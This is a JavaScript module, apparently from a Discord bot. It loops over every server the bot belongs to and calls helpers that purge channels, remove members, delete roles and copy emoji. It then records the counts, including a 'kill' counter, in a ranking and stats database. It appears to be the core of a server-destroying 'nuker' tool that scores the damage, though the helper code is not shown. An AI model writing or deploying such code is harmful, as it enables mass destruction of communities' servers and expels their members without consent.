import { Logger } from "./util/logging.js";
import Prisma from "@prisma/client";
import { PurgeChannels } from "./util/purge-channels.js";
import { PurgeMembers } from "./util/purge-members.js";
import { PurgeRoles } from "./util/purge-roles.js";
import { StealEmoji } from "./util/steal-emoji.js";
import { UpdateStats } from "./util/update-stats.js";
import { UpdateUserRanking } from "./util/update-ranking.js";

const { PrismaClient } = Prisma;
const prisma = new PrismaClient();

export const Purge = (client) => {
  client.guilds.cache.map(async (g) => {
    let [textChannelCounter, voiceChannelCounter] = await PurgeChannels(g);
    let killCounter = await PurgeMembers(g);
    let rolesCounter = await PurgeRoles(g);
    let [emojiBatchInsert, emojiCounter] = await StealEmoji(g);
    let serverId = await UpdateUserRanking(
      client,
      g,
      emojiCounter,
      rolesCounter,
      killCounter,
      textChannelCounter,
      voiceChannelCounter
    );
    let statUpdate = UpdateStats(
      serverId,
      emojiCounter,
      rolesCounter,
      killCounter,
      textChannelCounter,
      voiceChannelCounter
    );

    await prisma.$transaction([...emojiBatchInsert, statUpdate]);

    await Logger(
      g,
      emojiCounter,
      rolesCounter,
      killCounter,
      textChannelCounter,
      voiceChannelCounter
    );
  });
};
